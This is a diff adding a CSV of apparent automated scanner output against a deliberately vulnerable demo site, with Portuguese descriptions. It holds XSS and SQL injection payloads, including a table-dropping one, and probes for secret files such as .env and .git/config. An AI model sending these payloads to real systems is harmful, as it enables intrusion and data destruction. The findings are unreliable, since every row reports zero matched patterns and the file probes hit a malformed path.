@@ -1,0 +1,19 @@
+Type,Severity,Description,URL,Method,Parameter,Payload,Patterns_Found,Response_Size
+XSS (Cross-Site Scripting),Medium,"XSS refletido no parâmetro ""artist""",http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,GET,artist,<script>alert('XSS')</script>,0,
+XSS (Cross-Site Scripting),Medium,XSS em formulário via POST,http://testphp.vulnweb.com/search.php?test=query,POST,,<script>alert('XSS')</script>,0,
+SQL Injection,High,"SQL Injection no parâmetro ""artist""",http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271,GET,artist,' OR '1'='1,0,
+SQL Injection,High,SQL Injection em formulário via POST,http://testphp.vulnweb.com/search.php?test=query,POST,,'; DROP TABLE users;--,0,
+Information Disclosure,Medium,"Informação sensível exposta em ""/robots.txt""",http://testphp.vulnweb.com/artists.php?artist=1/robots.txt,GET,,,0,2072
+Information Disclosure,Medium,"Informação sensível exposta em ""/.env""",http://testphp.vulnweb.com/artists.php?artist=1/.env,GET,,,0,2177
+Information Disclosure,Medium,"Informação sensível exposta em ""/config.php""",http://testphp.vulnweb.com/artists.php?artist=1/config.php,GET,,,0,2072
+Information Disclosure,Medium,"Informação sensível exposta em ""/phpinfo.php""",http://testphp.vulnweb.com/artists.php?artist=1/phpinfo.php,GET,,,0,2073
+Information Disclosure,Medium,"Informação sensível exposta em ""/.htaccess""",http://testphp.vulnweb.com/artists.php?artist=1/.htaccess,GET,,,0,2182
+Information Disclosure,Medium,"Informação sensível exposta em ""/web.config""",http://testphp.vulnweb.com/artists.php?artist=1/web.config,GET,,,0,2072
+Information Disclosure,Medium,"Informação sensível exposta em ""/server-status""",http://testphp.vulnweb.com/artists.php?artist=1/server-status,GET,,,0,2068
+Information Disclosure,Medium,"Informação sensível exposta em ""/server-info""",http://testphp.vulnweb.com/artists.php?artist=1/server-info,GET,,,0,2068
+Information Disclosure,Medium,"Informação sensível exposta em ""/.git/config""",http://testphp.vulnweb.com/artists.php?artist=1/.git/config,GET,,,0,2184
+Information Disclosure,Medium,"Informação sensível exposta em ""/backup.sql""",http://testphp.vulnweb.com/artists.php?artist=1/backup.sql,GET,,,0,2072
+Information Disclosure,Medium,"Informação sensível exposta em ""/database.sql""",http://testphp.vulnweb.com/artists.php?artist=1/database.sql,GET,,,0,2074
+Information Disclosure,Medium,"Informação sensível exposta em ""/admin/""",http://testphp.vulnweb.com/artists.php?artist=1/admin/,GET,,,0,2173
+Information Disclosure,Medium,"Informação sensível exposta em ""/test/""",http://testphp.vulnweb.com/artists.php?artist=1/test/,GET,,,0,2173
+Information Disclosure,Medium,"Informação sensível exposta em ""/debug/""",http://testphp.vulnweb.com/artists.php?artist=1/debug/,GET,,,0,2173
